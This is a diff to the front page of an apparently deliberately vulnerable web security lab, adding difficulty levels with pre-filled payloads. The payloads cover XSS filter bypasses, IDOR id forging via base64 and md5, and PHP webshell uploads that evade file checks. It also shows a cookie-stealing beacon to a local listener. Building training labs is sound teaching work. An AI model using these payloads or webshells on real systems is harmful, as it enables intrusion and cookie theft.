@@ -51,31 +51,34 @@ walkthroughs in <code>SOLUTIONS.md</code>. The real pages are still under <a hre
      <span class="note">(reflected XSS also lives here: <code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>)</span></p>
   <div class="levels" id="lv_q"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('q','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('q','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('q','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('q','expert')">Expert</button></div>
   <details open><summary>💡 hint — <span class="note" id="note_q"></span></summary>
-    <code class="pl" id="pl_q"></code><button type="button" class="ghost" onclick="fill('in_q','pl_q')">use this ▶</button></details>
+    <code class="pl" id="pl_q"></code><button type="button" class="ghost" onclick="fill('in_q','pl_q')">use SQLi ▶</button>
+    <code class="pl" id="pl_qx"></code><button type="button" class="ghost" onclick="fill('in_q','pl_qx')">use XSS ▶</button></details>
   <form method="get" action="index.php" target="r_q" onsubmit="show('r_q')">
     <input type="hidden" name="level" id="lvl_q" value="easy">
     <input type="text" id="in_q" name="q" placeholder="your SQLi payload…"><button>Run ▶</button></form>
   <iframe name="r_q" id="r_q" class="res"></iframe></div>
 
-<!-- Guestbook: stored XSS -->
+<!-- Guestbook: stored XSS (leveled) -->
 <div class="card"><h2><code>index.php</code> guestbook <span class="flag-pill">🏁 stored XSS</span></h2>
-  <p class="muted">Post a comment; it's stored and rendered to every visitor. Steal the non-HttpOnly <code>flag</code> cookie.</p>
-  <details><summary>💡 hint</summary>Start a listener: <code>python3 -m http.server 9001</code>, post this, then reload Home:
-    <code class="pl" id="pl_gb">&lt;script&gt;new Image().src='http://127.0.0.1:9001/steal?c='+document.cookie&lt;/script&gt;</code>
-    <button type="button" class="ghost" onclick="document.getElementById('in_gb').value=document.getElementById('pl_gb').textContent">use this ▶</button></details>
+  <p class="muted">Post a comment; it's rendered to every visitor through the level's display filter. The page sets a non-HttpOnly <code>flag</code> cookie — swap <code>alert()</code> for a beacon (<code>new Image().src='http://127.0.0.1:9001/?c='+document.cookie</code>) to steal it.</p>
+  <div class="levels" id="lv_gb"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('gb','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('gb','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('gb','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('gb','expert')">Expert</button></div>
+  <details open><summary>💡 hint — <span class="note" id="note_gb"></span></summary>
+    <code class="pl" id="pl_gb"></code><button type="button" class="ghost" onclick="fill('in_gb','pl_gb')">use this ▶</button></details>
   <form method="post" action="index.php" target="r_gb" onsubmit="show('r_gb')">
+    <input type="hidden" name="level" id="lvl_gb" value="easy">
     <input type="text" name="author" placeholder="name" style="min-width:120px">
     <input type="text" id="in_gb" name="body" placeholder="message / payload…"><button>Post ▶</button></form>
   <iframe name="r_gb" id="r_gb" class="res"></iframe></div>
 
-<!-- Profile: IDOR -->
+<!-- Profile: IDOR (leveled) -->
 <div class="card"><h2><code>profile.php?id=</code> <span class="flag-pill">🏁 IDOR</span></h2>
-  <p class="muted">Profiles have no ownership check. Walk the ids (1 = admin).</p>
-  <details><summary>💡 hint</summary><code class="pl" id="pl_id">1</code>
-    <button type="button" class="ghost" onclick="fill('in_id','pl_id')">use this ▶</button>
-    <span class="muted"> · then try 2, 3, 4…</span></details>
+  <p class="muted">No ownership check. The id reference gets more obfuscated each level — all still forgeable. (1 = admin)</p>
+  <div class="levels" id="lv_id"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('id','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('id','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('id','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('id','expert')">Expert</button></div>
+  <details open><summary>💡 hint — <span class="note" id="note_id"></span></summary>
+    <code class="pl" id="pl_id"></code><button type="button" class="ghost" onclick="fill('in_id','pl_id')">use this ▶</button></details>
   <form method="get" action="profile.php" target="r_id" onsubmit="show('r_id')">
-    <input type="text" id="in_id" name="id" placeholder="a user id…" style="min-width:120px"><button>Run ▶</button></form>
+    <input type="hidden" name="level" id="lvl_id" value="easy">
+    <input type="text" id="in_id" name="id" placeholder="id (or encoded id)…" style="min-width:170px"><button>Run ▶</button></form>
   <iframe name="r_id" id="r_id" class="res"></iframe></div>
 
 <!-- Net Tools: command injection (leveled) -->
@@ -100,12 +103,14 @@ walkthroughs in <code>SOLUTIONS.md</code>. The real pages are still under <a hre
     <input type="text" id="in_pg" name="page" placeholder="file path…"><button>Run ▶</button></form>
   <iframe name="r_pg" id="r_pg" class="res"></iframe></div>
 
-<!-- Upload: webshell -->
+<!-- Upload: webshell (leveled) -->
 <div class="card"><h2><code>upload.php</code> → <code>uploads/</code> <span class="flag-pill">🏁 upload → RCE</span></h2>
-  <p class="muted">No file-type checks. Upload a PHP webshell, then run commands through it.</p>
-  <details><summary>💡 hint</summary>Upload the code below as <code>shell.php</code>, then run <code>cat ../private/upload_flag.txt</code> in the command box.</details>
-  <label class="muted">1) shell code &amp; name</label>
-  <textarea id="up_code">&lt;?php system($_GET['cmd']); ?&gt;</textarea>
+  <p class="muted">Upload a PHP webshell, then run commands. The file checks escalate each level (the content-type is sent as image/gif for you).</p>
+  <div class="levels" id="lv_up"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('up','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('up','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('up','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('up','expert')">Expert</button></div>
+  <input type="hidden" id="lvl_up" value="easy">
+  <p class="note" id="note_up"></p>
+  <label class="muted">1) shell code (pre-filled per level) &amp; name</label>
+  <textarea id="up_code"></textarea>
   <form onsubmit="doUpload();return false"><input type="text" id="up_name" value="shell.php" style="min-width:120px"><button>Upload ▶</button></form>
   <pre id="r_up" class="rx"></pre>
   <label class="muted">2) run a command through uploads/shell.php</label>
@@ -155,18 +160,29 @@ const PAYLOADS = {
   expert:{p:"php://filter/convert.base64-encode/resource=../lfi_secret/flag.txt", n:"Expert — traversal blocked; use the php://filter wrapper, then base64-decode the output."}
  }
 };
+PAYLOADS.q.easy.x='"><script>alert(1)</script>';
+PAYLOADS.q.medium.x='"><img src=x onerror=alert(1)>';
+PAYLOADS.q.hard.x='"><details open ontoggle=alert(1)>';
+PAYLOADS.q.expert.x='"><input autofocus onfocus=alert(1)>';
+PAYLOADS.gb={easy:{p:"<script>alert(document.cookie)</script>",n:"Easy — raw render."},medium:{p:"<img src=x onerror=alert(document.cookie)>",n:"Medium — '<script' stripped once → <img onerror>."},hard:{p:"<details open ontoggle=alert(document.cookie)>",n:"Hard — onerror/onload also stripped → ontoggle."},expert:{p:"<input autofocus onfocus=alert(document.cookie)>",n:"Expert — ontoggle also stripped → autofocus+onfocus."}};
+PAYLOADS.id={easy:{p:"1",n:"Easy — raw id, just change it."},medium:{p:"(id box ignored)",n:"Medium — id comes from the uid cookie. Set cookie uid=1 in DevTools, then Run."},hard:{p:"MQ==",n:"Hard — id is base64. MQ== = base64 of 1."},expert:{p:"c4ca4238a0b923820dcc509a6f75849b",n:"Expert — id is md5(real). This string is md5 of 1."}};
+PAYLOADS.up={easy:{p:"<?php system($_GET['cmd']); ?>",n:"Easy — no checks."},medium:{p:"<?php system($_GET['cmd']); ?>",n:"Medium — content-type must be image/* (sent as image/gif for you)."},hard:{p:"GIF89a<?php system($_GET['cmd']); ?>",n:"Hard — content must start with GIF89a magic bytes (prefixed)."},expert:{p:"GIF89a<?php passthru($_GET['cmd']); ?>",n:"Expert — the word 'system' is blocked → passthru()."}};
 function setLvl(card,lvl){
-  document.getElementById('lvl_'+card).value=lvl;
-  document.getElementById('pl_'+card).textContent=PAYLOADS[card][lvl].p;
-  document.getElementById('note_'+card).textContent=PAYLOADS[card][lvl].n;
+  var Ld=document.getElementById('lvl_'+card); if(Ld) Ld.value=lvl;
+  var d=PAYLOADS[card][lvl];
+  if(card==='up'){ document.getElementById('up_code').value=d.p; }
+  else { var pl=document.getElementById('pl_'+card); if(pl) pl.textContent=d.p; }
+  var nt=document.getElementById('note_'+card); if(nt) nt.textContent=d.n;
+  var plx=document.getElementById('pl_'+card+'x'); if(plx && d.x) plx.textContent=d.x;
   document.querySelectorAll('#lv_'+card+' .lvlbtn').forEach(function(b){ b.classList.toggle('on', b.getAttribute('data-l')===lvl); });
 }
-['q','cmd','pg'].forEach(function(c){ setLvl(c,'easy'); });
+['q','cmd','pg','gb','id','up'].forEach(function(c){ setLvl(c,'easy'); });
 function doUpload(){
   var out=document.getElementById('r_up'); out.style.display='block'; out.textContent='uploading…';
+  var lvl=(document.getElementById('lvl_up')||{}).value||'easy';
   var name=document.getElementById('up_name').value||'shell.php';
-  var fd=new FormData(); fd.append('file', new Blob([document.getElementById('up_code').value],{type:'application/x-httpd-php'}), name);
-  fetch('upload.php',{method:'POST',body:fd}).then(r=>r.text()).then(t=>out.textContent=t.replace(/<[^>]*>/g,' ').replace(/\s+/g,' ').trim()).catch(e=>out.textContent='error: '+e);
+  var fd=new FormData(); fd.append('file', new Blob([document.getElementById('up_code').value],{type:'image/gif'}), name);
+  fetch('upload.php?level='+lvl,{method:'POST',body:fd}).then(r=>r.text()).then(t=>out.textContent=t.replace(/<[^>]*>/g,' ').replace(/\s+/g,' ').trim()).catch(e=>out.textContent='error: '+e);
 }
 </script>
 </body></html>
